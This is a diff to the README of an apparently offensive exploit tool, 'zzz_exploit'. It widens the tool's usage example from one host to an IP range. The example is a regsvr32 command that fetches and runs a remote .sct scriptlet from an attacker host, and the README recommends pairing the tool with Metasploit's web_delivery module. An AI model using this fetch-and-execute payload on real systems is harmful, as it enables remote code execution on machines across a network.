@@ -10,6 +10,7 @@ Full credit goes to Worawit/Sleepya and Korey McKinley!
 Best usage, and what I tested it with, is using the web_delivery module in metasploit. With the generated command, pass it into -c in quotes. This is also what Korey showed in his article!
 
 Logger.py is just a script I've been reusing with all my code to prettify output. If deleted, zzz will break :)
+ip_parser.py is just a script for parsing different IP/network formats. (192.168.0.0/24, 192.168.0.0-150, etc)
 
 ## Help page output:
 ```
@@ -41,6 +42,6 @@ optional arguments:
   -c , --command    Command to add to service
   -P , --pipe       Pipe to connect to
   --version         show program's version number and exit
-Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
+Example: python zzz_exploit -t 192.168.0.1-100 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
 My write-up: https://mez0.cc/posts/weaponised-worawit.html
